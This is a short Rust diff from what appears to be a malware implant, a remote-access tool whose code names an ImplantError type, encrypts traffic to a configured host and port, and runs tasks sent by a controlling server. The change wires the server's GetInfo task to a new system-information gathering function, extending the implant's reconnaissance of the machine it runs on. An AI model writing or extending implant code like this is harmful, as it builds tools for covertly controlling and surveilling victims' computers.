@@ -7,6 +7,7 @@ use std::str::FromStr;
 use x25519_dalek::{PublicKey, StaticSecret};
 
 use crate::models::task;
+use crate::tasks::system;
 use crate::utils::network_encryption;
 use crate::{errors::ImplantError, HOST, PORT, PROTOCOL};
 
@@ -65,7 +66,7 @@ pub fn handle_available_tasks(
         // Using unwrap is safe here because task is sent from server
         let task = task::Tasks::from_str(task.task.as_str()).unwrap();
         match task {
-            task::Tasks::GetInfo => unimplemented!(),
+            task::Tasks::GetInfo => system::gather_system_info(),
             _ => process::exit(1),
         }
     }
